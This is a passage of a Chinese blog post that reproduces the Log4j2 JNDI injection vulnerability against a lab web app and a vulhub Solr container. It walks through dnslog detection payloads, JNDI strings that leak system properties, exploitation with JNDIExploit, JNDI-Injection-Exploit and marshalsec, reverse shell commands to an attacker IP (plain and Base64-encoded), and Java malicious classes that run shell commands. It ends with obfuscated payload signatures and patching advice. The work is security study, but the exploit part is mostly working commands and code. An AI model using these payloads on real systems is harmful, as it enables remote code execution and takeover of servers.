class="language-bash">测试页面是http://124.223.217.243:28080/hello/</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">完整url</span></span><br><span class="line">http://124.223.217.243:28080/hello/?payload=%24%7Bjndi%3Aldap%3A%2F%2Fa8x0nz.dnslog.cn%7D</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用url编码后的payload进行发送，refresh  dnslog网站，查看是否有返回ok？</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">burp发送请求的话，需要全部url编码，burp中选中payload，右键即可全部转换为url编码</span></span><br><span class="line">payload=%24%7b%6a%6e%64%69%3a%6c%64%61%70%3a%2f%2f%6c%35%77%37%63%76%2e%64%6e%73%6c%6f%67%2e%63%6e%7d</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209222048048.png" alt="image-20220922204858881" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209222050719.png" alt="image-20220922205003522" style="zoom:50%;" /><p>Post方式：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /hello HTTP/1.1</span><br><span class="line">Host: 124.223.217.243:28080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.57</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Cookie: csrftoken=sc2j11fPfqKlk6m0EYxXKtpNuUCeccNs8t0Fuxq4k0kcYdk6b0ilBpy9xaPchp10; session=12967580-f066-4068-8ba6-91afc14e68d1.rXkKzehkONdyIbho79CnnaKBvRU; toggle=true; portainer.pagination_images=50; portainer.pagination_containers=25</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 39</span><br><span class="line"></span><br><span class="line">payload=$&#123;jndi:ldap://a8x0nz.dnslog.cn&#125;</span><br></pre></td></tr></table></figure><p>dnslog的结果意味着，目标机器有通过<strong>jndi的方式访问ldap</strong>，ldap是轻量级目录访问协议，会向<code>a8x0nz.dnslog.cn</code>发起请求。在请求<code>a8x0nz.dnslog.cn</code>域名的时候，就会有一个域名解析的过程。解析该域名的时候，就会被记录到该dnslog网站之中。</p><blockquote><p>同理我们可以用rmi的方式请求，漏洞复现二之中有写</p></blockquote><p><strong>当有解析记录的时候，这意味着目标网站存在该漏洞！！~</strong></p><p><strong><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209222004035.png" alt="image-20220922200454642" style="zoom: 33%;" /></strong></p><p>我们在请求子域1111.a8x0nz.dnslog.cn的时候，依旧会解析到a8x0nz.dnslog.cn上，会存在解析的记录</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209222012201.png" alt="image-20220922201242966" style="zoom: 33%;" /><h2 id="EXP测试"><a href="#EXP测试" class="headerlink" title="EXP测试"></a>EXP测试</h2><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><ol><li><p>下载JNDIExploit工具</p><blockquote><p><a href="https://github.com/Mr-xn/JNDIExploit-1/releases/tag/v1.2">https://github.com/Mr-xn/JNDIExploit-1/releases/tag/v1.2</a></p><p>该工具可以快速搭建一个JNDI服务</p><p>关于该工具！！在使用<strong>反序列化，jndi注入等情景</strong>的时候，可以想到用此工具</p><p><code>java -jar JNDIExploit-1.2-SNAPSHOT.jar -u</code>查看具体的语法，也是蛮好用的</p><p>实现了诸多功能</p><p>关于反序列化这方面知识了解的较少：</p><blockquote><ul><li>Gadget是指利用链</li><li>cc1是指CommonsCollectionsK1</li><li>cc2是指CommonsCollectionsK2</li></ul></blockquote></blockquote></li><li><p>使用JNDIExploit工具搭建恶意JNDI服务</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看选项</span></span><br><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -h</span><br><span class="line">-i, --ip       Local ip address</span><br><span class="line">    -l, --ldapPort Ldap bind port (default: 1389)#ldap服务</span><br><span class="line">    -p, --httpPort Http bind port (default: 8080)#http服务</span><br><span class="line">    -u, --usage    Show usage (default: false)</span><br><span class="line">    -h, --help     Show this help</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">搭建</span></span><br><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 124.223.217.243</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209222104305.png" alt="image-20220922210418072"></p><blockquote><p>有时该工具会抛出一个异常，显示ldap的1389端口被占用了~~，但是实际上并没有，不用管这个问题即可</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221718477.png" alt="image-20220922171815325" style="zoom: 33%;" /></blockquote></li><li><p>启动监听端口接收shell</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure></li><li><p>构造EXP</p></li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">反弹shell命令</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/124.223.217.243/8888 0&gt;&amp;1</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">base64</span>编码 -&gt; url编码</span></span><br><span class="line"><span class="meta prompt_">YmFzaCAtaSA%</span><span class="language-bash">2BJiAvZGV2L3RjcC8xMjQuMjIzLjIxNy4yNDMvODg4OCAwPiYx</span></span><br></pre></td></tr></table></figure><p>得到反弹shell的EXP：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;jndi:ldap://124.223.217.243:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjQuMjIzLjIxNy4yNDMvODg4OCAwPiYx&#125;</span></span><br></pre></td></tr></table></figure><p>对EXP进行URL编码：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">%</span><span class="language-bash">24%7Bjndi%3Aldap%3A%2F%2F124.223.217.243%3A1389%2FTomcatBypass%2FCommand%2FBase64%2FYmFzaCAtaSA%252BJiAvZGV2L3RjcC8xMjQuMjIzLjIxNy4yNDMvODg4OCAwPiYx%7D</span></span><br></pre></td></tr></table></figure><ol start="5"><li>发送Payload请求：</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221719387.png" alt="image-20220922171918288" style="zoom: 33%;" /><ol start="6"><li><p>弹回shell</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209222129656.png" alt="image-20220922212906478" style="zoom:50%;" /></li></ol><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h3><p><strong>解释一下该payload做的事情：</strong></p><blockquote><p>当我们发送请求后，若网站存在漏洞，则会向ldap服务器发送请求（也就是我们之前用<code>JNDIExploit</code>搭建的JDNI恶意服务，其架设在<code>124.223.217.243:1389</code>端口上。）</p><p>当我们请求到了JNDI服务器之后，其会在<code>/TomcatBypass/Command/Base64/</code>接口下，对我们附带的payload进行base64解密。然后将结果（也就是payload）返回给网站（受害机器）执行</p><p>我们需要注意，JNDI是一组在Java应用中访问命名和目录服务的API,命名服务将名称和对象联系起来,使得我们可以用名称访问对象。我们访问搭建的恶意LDAP，便拿到了返回的经过解码的fantanshell的命令</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209222129130.png" alt="image-20220922212939903"></p><p>加载执行后，在监听的端口上便会拿到shell</p></blockquote><h1 id="漏洞复现二"><a href="#漏洞复现二" class="headerlink" title="漏洞复现二"></a>漏洞复现二</h1><blockquote><p>涉及solr组件</p><p>Solr是一个可扩展的，可部署，搜索&#x2F;存储引擎，优化搜索大量以文本为中心的数据</p><blockquote><p> <a href="https://www.cnblogs.com/Ge-Zsj/p/14510115.html">什么是Solr,它能为我们解决什么问题,怎么用?</a></p></blockquote></blockquote><h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote><p>docker-compose.yml</p></blockquote><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"> <span class="attr">solr:</span></span><br><span class="line">   <span class="attr">image:</span> <span class="string">vulhub/solr:8.11.0</span></span><br><span class="line">   <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;8983:8983&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">#目标</span><br><span class="line">http://124.223.217.243:8983/solr/</span><br></pre></td></tr></table></figure><h2 id="POC测试-1"><a href="#POC测试-1" class="headerlink" title="POC测试"></a>POC测试</h2><p>到了solr界面上，就导出点点看，看看有什么地方可以输入的，去找可以插入的地方，尝试插入poc测试~~</p><p>于是找得到在这个地方~~插入构造的payload</p><p>还有可疑的参数，都可以插一插</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209222302406.png" alt="image-20220922230202224" style="zoom:33%;" /><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下面两种皆可</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;jndi:ldap://tjxy78.dnslog.cn&#125;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">利用java获取系统版本，若成功，意味着我们可以获取更多信息</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;jndi:ldap://<span class="variable">$&#123;sys:java.version&#125;</span>.tjxy78.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">#payload</span><br><span class="line">http://124.223.217.243:8983/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.tjxy78.dnslog.cn&#125;</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209222304824.png" alt="image-20220922230411716" style="zoom:50%;" /><blockquote><p>一旦探测成功，也就是我们可以构造各种各样的payload获取各种系统属性：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">获取java路径</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;jndi:ldap://<span class="variable">$&#123;sys:java.home&#125;</span>.tjxy78.dnslog.cn&#125;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">获取用户名</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;jndi:ldap://<span class="variable">$&#123;sys:user.name&#125;</span>.qj1n1s.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209222314706.png" alt="image-20220922231403614" style="zoom:50%;" /><blockquote><p>java可以获取的系统属性，可以参考如下文章</p><ul><li><a href="https://www.cnblogs.com/blogsme/p/3299711.html">java系统属性</a></li><li><a href="https://blog.csdn.net/u010675669/article/details/86150754">java系统属性（Java System Properties）</a></li></ul></blockquote></blockquote><h2 id="EXP测试-1"><a href="#EXP测试-1" class="headerlink" title="EXP测试"></a>EXP测试</h2><h3 id="利用过程-1"><a href="#利用过程-1" class="headerlink" title="利用过程"></a>利用过程</h3><ol><li><p>下载 JNDI-Injection-Exploit 工具</p><blockquote><p>感觉这个工具比前面的那个JNDI Exploit工具好用一点</p></blockquote><blockquote><p><a href="https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0">https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0</a></p></blockquote></li><li><p>构造命令执行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/124.223.217.243/9090 0&gt;&amp;1</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">base64</span>编码</span></span><br><span class="line">YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIzLjIxNy4yNDMvOTA5MCAwPiYx</span><br></pre></td></tr></table></figure><p>为了payload能被<code>java-runtime-exec</code>执行，需要对之进行转换：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIzLjIxNy4yNDMvOTA5MCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure></li><li><p>工具使用</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">就这一个用法</span></span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;command&quot; -A address</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">payload：</span></span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIzLjIxNy4yNDMvOTA5MCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A 124.223.217.243</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行结果</span></span><br><span class="line">[ADDRESS] &gt;&gt; 124.223.217.243</span><br><span class="line">[COMMAND] &gt;&gt; bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIzLjIxNy4yNDMvOTA5MCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line">----------------------------JNDI Links----------------------------</span><br><span class="line">Target environment(Build in JDK 1.7 whose trustURLCodebase is true):</span><br><span class="line">rmi://124.223.217.243:1099/ovhvdw</span><br><span class="line">ldap://124.223.217.243:1389/ovhvdw</span><br><span class="line">Target environment(Build in JDK 1.8 whose trustURLCodebase is true):</span><br><span class="line">rmi://124.223.217.243:1099/dgne6a</span><br><span class="line">ldap://124.223.217.243:1389/dgne6a</span><br><span class="line">Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):</span><br><span class="line">rmi://124.223.217.243:1099/yvdh2q</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在这些端口上开启了监听，等待访问</span></span><br><span class="line">----------------------------Server Log----------------------------</span><br><span class="line">2022-09-22 23:44:12 [JETTYSERVER]&gt;&gt; Listening on 0.0.0.0:8180</span><br><span class="line">2022-09-22 23:44:12 [RMISERVER]  &gt;&gt; Listening on 0.0.0.0:1099</span><br><span class="line">2022-09-22 23:44:12 [LDAPSERVER] &gt;&gt; Listening on 0.0.0.0:1389</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>从工具返回给我们的payload我们可以看到，我们不仅可以利用ldap，也可以使用rmi方式进行getshell</p></blockquote></li><li><p>得到反弹shell的EXP</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">注意选择对应java版本的payload。至于怎么获得java版本嘛，前面有讲到，很简单</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Target environment(Build <span class="keyword">in</span> JDK 1.8 whose trustURLCodebase is <span class="literal">true</span>):</span></span><br><span class="line">rmi://124.223.217.243:1099/dgne6a</span><br><span class="line">ldap://124.223.217.243:1389/dgne6a</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">套上<span class="string">&quot;壳&quot;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;jndi:rmi://124.223.217.243:1099/dgne6a&#125;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;jndi:ldap://124.223.217.243:1389/dgne6a&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>监听</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 9090</span><br></pre></td></tr></table></figure></li><li><p>发送EXP</p></li></ol><blockquote><p>我们访问随机产生的接口路径<code>/dgne6a</code>，就会返回在目标机器上执行**[COMMAND] &gt;&gt;** <code>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIzLjIxNy4yNDMvOTA5MCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;jndi:rmi://124.223.217.243:1099/dgne6a&#125;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;jndi:ldap://124.223.217.243:1389/dgne6a&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">payload</span></span><br><span class="line">http://124.223.217.243:8983/solr/admin/cores?action=$&#123;jndi:ldap://124.223.217.243:1389/dgne6a&#125;</span><br></pre></td></tr></table></figure><ol start="7"><li>得到shell</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209230021150.png" alt="image-20220923002110054" style="zoom:50%;" /><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a><strong>原理</strong></h3><p><strong>解释一下该payload做的事情：</strong></p><blockquote><p>发送payload之后，便会使用jndi向rmi发起请求，</p><p>rmi再向远程恶意服务器<code>124.223.217.243:1099</code>的<code>/dgne6a</code>接口发起请求，</p><p>rmi访问接口即是远程加载类的过程，但此时加载的是我们搭建的恶意rmi服务的恶意类，并执行恶意类的方法，这个方法之中就是我们直接写入反弹shell的方法</p><p>在日志中我们也可以看到工具所生成的恶意类文件(.class)：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209230035762.png" alt="image-20220923003513323"></p></blockquote><h1 id="漏洞复现三"><a href="#漏洞复现三" class="headerlink" title="漏洞复现三"></a>漏洞复现三</h1><blockquote><p>手动编写代码利用，在讲fastjson的时候，有讲到手动编写代码+jndi+rmi&#x2F;ldap的方式，加载恶意类对之利用的方法</p><p>手动的利用，有助于理解上述工具的工作过程！~~</p></blockquote><h2 id="编写并编译恶意代码"><a href="#编写并编译恶意代码" class="headerlink" title="编写并编译恶意代码"></a>编写并编译恶意代码</h2><blockquote><p>Touch.java</p><blockquote><p>touch在&#x2F;tmp目录生成一个alvin的文件</p></blockquote></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Touch.java</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Touch</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Touch</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;/bin/touch /tmp/alvin&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argv)</span>&#123;</span><br><span class="line">        <span class="type">Touch</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Touch</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">编译生成恶意类</span></span><br><span class="line">javac Touch.java</span><br></pre></td></tr></table></figure><blockquote><p>Exploit.java</p><blockquote><p>反弹shell:<code>bash -i &gt;&amp; /dev/tcp/124.223.217.243/4433 0&gt;&amp;1</code></p></blockquote></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Exploit.java</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;/bin/bash -c &#123;echo,</span></span><br><span class="line"><span class="string">YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIzLjIxNy4yNDMvNDQzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argv)</span>&#123;</span><br><span class="line">        <span class="type">Exploit</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Exploit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">编译生成恶意类</span></span><br><span class="line">javac Exploit.java</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在java文件目录下启动http服务，供远程下载恶意类</span></span><br><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure><h2 id="启动LDAP服务"><a href="#启动LDAP服务" class="headerlink" title="启动LDAP服务"></a>启动LDAP服务</h2><ul><li><p>创建文件touch</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下载完恶意类后，用工具起一个LDAP服务,</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">&quot;http://124.223.217.243:8000/#Touch&quot;</span>是供远程加载的恶意类文件，注意！！是供远程加载</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">marshalsec.jndi.LDAPRefServer指定了启动的服务类型</span></span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://124.223.217.243:8000/#Touch&quot; 9999</span><br></pre></td></tr></table></figure></li><li><p>反弹shell</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://120.27.61.239:8000/#Exploit&quot; 9999</span><br></pre></td></tr></table></figure></li></ul><h2 id="监听端口"><a href="#监听端口" class="headerlink" title="监听端口"></a>监听端口</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvvp 4433</span><br></pre></td></tr></table></figure><h2 id="发送Payload"><a href="#发送Payload" class="headerlink" title="发送Payload"></a>发送Payload</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建文件</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;jndi:ldap://124.71.45.28:9999/Touch&#125;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">burp发送的话需要URL编码：</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">24%7Bjndi%3Aldap%3A%2F%2F124.71.45.28%3A9999%2FTouch%7D</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">反弹shell</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;jndi:ldap://124.71.45.28:9999/Exploit&#125;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">burp发送的话需要URL编码：</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">24%7Bjndi%3Aldap%3A%2F%2F124.71.45.28%3A9999%2FExploit%7D</span></span><br></pre></td></tr></table></figure><h2 id="得到Shell"><a href="#得到Shell" class="headerlink" title="得到Shell"></a>得到Shell</h2><p>在监听位置可以拿到shell</p><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a><strong>原理</strong></h2><p><strong>解释一下该payload做的事情：</strong></p><blockquote><p>当我们发送payload<code>$&#123;jndi:ldap://124.71.45.28:9999/Exploit&#125;</code>的时候，会使用jndi向我们搭建的ldap服务器发起请求，请求<strong>Exploit</strong>这个类，</p><p>在LDAP服务器那边，会重定向调用远程类（也就是我们http起的服务上面的类文件）</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209230101463.png" alt="image-20220923010131357"></p><p>会向<code>http://124.223.217.243:8000/Exploit</code>发起请求，加载其恶意类，然后执行其恶意方法反弹shell</p></blockquote><h1 id="log4j2漏洞流量特征"><a href="#log4j2漏洞流量特征" class="headerlink" title="log4j2漏洞流量特征"></a>log4j2漏洞流量特征</h1><blockquote><p>这个流量特征怎么判断呢，一方面是payload大概长什么样子，结果前面的学习可以知道，大概的轮廓</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">很显然，利用jndi，多多少少有下面字样</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;jndi:ldap://tjxy78.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>更多的变体可以查看log4j2扫描工具里面那些大佬写的payload。实际上log4j2工具也就是根据特征，判断网站有莫有log4j2的漏洞~</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209231250273.png" alt="image-20220923125013065"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">LDAP - $(indi:Idap://example.com/GQ)</span><br><span class="line">LDAP - $(jndi:ldap://example.com/jw&#125;</span><br><span class="line">RMI  - $(ndi:rmi://example.com&#125;</span><br><span class="line">RMI  - $($[lower:$(lower:jndi):$[lower:rmi)://example.com/&#125;</span><br><span class="line">RMI  - $($[lower:jndi):$&#123;lower:rmi)://example.com/FcrY&#125;</span><br><span class="line">RMI  - $($(lower:j)$(lower:n)$(lower:d&#125;i:$&#123;lower:rmi)://example.com/glvLd&#125;</span><br><span class="line">RMI  - $($(lower:j)$(upper:n)$(lower:d&#125;$(upper:i):$&#123;lower:r&#125;m$(lower:i])://example.com/zPc&#125;</span><br><span class="line">DNS  - $(jndi:dns://example.com/zVu)</span><br><span class="line">LDAP - $(jndi:$(lower:I)$[lower:d)a$(lower:p)://example.com/Hp&#125;</span><br></pre></td></tr></table></figure></blockquote><h1 id="漏洞修复建议"><a href="#漏洞修复建议" class="headerlink" title="漏洞修复建议"></a>漏洞修复建议</h1><h2 id="通用修补建议"><a href="#通用修补建议" class="headerlink" title="通用修补建议"></a>通用修补建议</h2><blockquote><p>升级到最新版本 2.15.0-rc2 ：<br><a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a></p></blockquote><h2 id="临时修补建议"><a href="#临时修补建议" class="headerlink" title="临时修补建议"></a>临时修补建议</h2><blockquote><ol><li>设置JVM启动参数 <code>-Dlog4j2.formatMsgNoLookups=true</code> 。</li><li>尽量使用JDK 版本大于11.0.1、8u191、7u201、6u211，需要注意的是，即使是使用了 JDK 高版本也不能完全保证安全，依然存在本地绕过的情况。</li><li>限制不必要的业务访问外网。</li><li>采用 rasp 对 lookup 的调用进行阻断。</li><li>设置“log4j2.formatMsgNoLookups&#x3D;True” </li><li>系统环境变量“FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS”设置 为“true”</li></ol></blockquote><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li><p><a href="https://zhuanlan.zhihu.com/p/444140910">log4j 远程命令执行漏洞原理及修复方案</a></p></li><li><p><a href="https://www.pudn.com/news/6279fcca517cd20ea4ea47b9.html%E4%B8%80%E7%9C%8B%E4%BE%BF%E6%87%82">https://www.pudn.com/news/6279fcca517cd20ea4ea47b9.html一看便懂</a></p></li><li><p><a href="https://www.yijinglab.com/expc.do?ec=ECID34f9-9847-48b5-85b4-20e9d3bbcd94">log4j2漏洞    CVE-2021-44228 log4jRCE漏洞复现</a></p></li><li><p><a href="https://www.freebuf.com/sectool/313774.html">Apache Log4j2 RCE原理验证和复现</a></p></li><li><p><a href="https://www.jianshu.com/p/1517b8c8ebf9">核弹级!log4j 2漏洞原理及复现</a></p></li><li><p><a href="https://mp.weixin.qq.com/s/TJTOh0q0OY-j6msP6XSErg">JAVA JNDI注入知识详解</a></p></li></ul></blockquote>]]></content>
      
      
      <categories>
          
